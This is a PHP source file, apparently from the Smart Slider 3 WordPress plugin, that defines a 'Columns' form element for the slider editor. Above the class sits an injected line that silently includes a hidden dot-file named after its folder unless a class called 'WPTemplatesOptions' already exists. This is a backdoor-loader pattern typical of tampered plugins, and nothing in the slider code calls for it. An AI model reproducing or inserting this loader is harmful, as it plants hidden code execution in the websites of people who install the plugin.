<?php


namespace Nextend\SmartSlider3\Form\Element;


use Nextend\Framework\Asset\Js\Js;
use Nextend\Framework\Form\Element\AbstractFieldHidden;
use Nextend\Framework\View\Html;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Columns extends AbstractFieldHidden {

    protected $hasTooltip = false;

    public function __construct($insertAt, $name = '', $default = '', $parameters = array()) {
        parent::__construct($insertAt, $name, false, $default, $parameters);
    }

    protected function fetchElement() {

        Js::addInline('new N2Classes.FormElementColumns("' . $this->fieldID . '");');

        return Html::tag('div', array(
            'class' => 'n2_field_columns'
        ), Html::tag('div', array(
                'class' => 'n2_field_columns__content'
            ), '') . Html::tag('div', array(
                'class'      => 'n2_field_columns__add',
                'data-n2tip' => n2_('Add column')
            ), '<div class="ssi_16 ssi_16--plus"></div>') . parent::fetchElement());
    }
}